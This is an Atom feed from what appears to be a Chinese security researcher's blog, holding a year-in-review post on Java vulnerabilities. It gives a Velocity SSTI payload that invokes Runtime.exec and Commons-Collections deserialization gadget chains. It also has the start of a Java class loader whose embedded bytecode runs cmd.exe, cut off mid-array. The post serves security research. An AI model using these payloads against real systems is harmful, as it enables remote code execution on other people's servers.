<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>像清水一般清澈透明</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://summersec.github.io/"/>
  <updated>2021-01-24T13:13:20.346Z</updated>
  <id>https://summersec.github.io/</id>
  
  <author>
    <name>SummerSec</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020年研究回顾总结</title>
    <link href="https://summersec.github.io/2021/04/04/2020%E5%B9%B4%E7%A0%94%E7%A9%B6%E5%9B%9E%E9%A1%BE%E6%80%BB%E7%BB%93/"/>
    <id>https://summersec.github.io/2021/04/04/2020%E5%B9%B4%E7%A0%94%E7%A9%B6%E5%9B%9E%E9%A1%BE%E6%80%BB%E7%BB%93/</id>
    <published>2021-04-04T00:22:16.000Z</published>
    <updated>2021-01-24T13:13:20.346Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; 这篇文章是一遍概述，浓缩性的文章，大致内容是将我研究的内容，回归总结。将分析文章总一个压缩在压缩性质的总结。尽可能保证用最简单话写最多的内容，都是自己的理解，如有错误还请谅解。所有的具体分析文章都在博客中，博客地址：<a href="https://summersec.github.io">https://summersec.github.io</a></p><hr><h1 id="SSTI-服务端模板注入"><a href="#SSTI-服务端模板注入" class="headerlink" title="SSTI 服务端模板注入"></a>SSTI 服务端模板注入</h1><p>&emsp;&emsp; 服务端模板注入漏洞普遍存在于使用某种模板引擎模板解析（翻译）和数据渲染，目的是渲染或者解析页面速度更快，更加便捷。<br>&emsp;&emsp; 下面是Velocity模板引擎的SSTI漏洞Payload，很容易就发现Payload使用Java反射的知识。Velocity模板引擎语法加上Java反射配合，使用SSTI漏洞变成了可能。其实绝大多数情况下基本上SSTI服务端模板注入形成原因都是这样子，==模板语法+Java反射==。当然有些模板引擎会禁用底层JDK某些方法，当然Bypass就可以使用Java反射调用被禁用的某些底层类。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=#set($x='') </span><br><span class="line">#set($rt=$x.class.forName('java.lang.Runtime')) </span><br><span class="line">#set($chr=$x.class.forName('java.lang.Character')) </span><br><span class="line">#set($str=$x.class.forName('java.lang.String')) </span><br><span class="line">#set($ex=$rt.getRuntime().exec('calc'))</span><br><span class="line">$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure><hr><h1 id="CommonsCollections反序列化"><a href="#CommonsCollections反序列化" class="headerlink" title="CommonsCollections反序列化"></a>CommonsCollections反序列化</h1><p>&emsp;&emsp; 目前commons-collections的反序列化漏洞主要以3和4(版本)为主流，3和4的利用方式也不同，Gadget链也不相同。</p><hr><h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><p>&emsp;&emsp; BadAttributeValueExpException这个类是javax.management报下的一个异常处理类，是jdk自带的，无需依赖第三方。它继承了Serializable接口满足反序列化漏洞的条件，它只有一个值权限是<code>private不可直接修改</code>，但利用反射机制修改其权限来到达触发反序列化漏洞的目的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 下面一张图很完美解释了<code>Transformer数组</code>的功能，其实本质还是Java反射调用。<br><img src="https://img-blog.csdnimg.cn/2021012417002995.png" alt="在这里插入图片描述"></p><hr><h2 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2><p>&emsp;&emsp;  PriorityQueue原本只是个优先队列，TemplatesImpl原本只是在xalan中的处理xml的模板实现，二者相互结合。先将恶意字节码通过修改字节码方式植入TemplatesImpl类中，然后用PriorityQueue类<code>比较特性</code>触发漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue.readObject()</span><br><span class="line">            ...</span><br><span class="line">                TransformingComparator.compare()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            TemplatesImpl.newTransformer()</span><br><span class="line">                                TemplatesImpl.getTransletInstance()</span><br><span class="line">                                    TemplatesImpl.defineTransletClasses()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200519095242678.png" alt></p><hr><h1 id="反序列化回显"><a href="#反序列化回显" class="headerlink" title="反序列化回显"></a>反序列化回显</h1><h2 id="defineclass异常回显"><a href="#defineclass异常回显" class="headerlink" title="defineclass异常回显"></a>defineclass异常回显</h2><p>&emsp;&emsp; defineclass是java.lang.ClassLoader类下的一个类方法，将字节码转化为Class类。使用该类加载生成恶意的类字节码，恶意类里面包含着一个恶意命令然后使用异常回显出命令执行的结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载恶意类字节码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Summer类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// Summer.class类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">76</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">103</span>, <span class="number">98</span>, <span class="number">107</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">102</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">78</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span 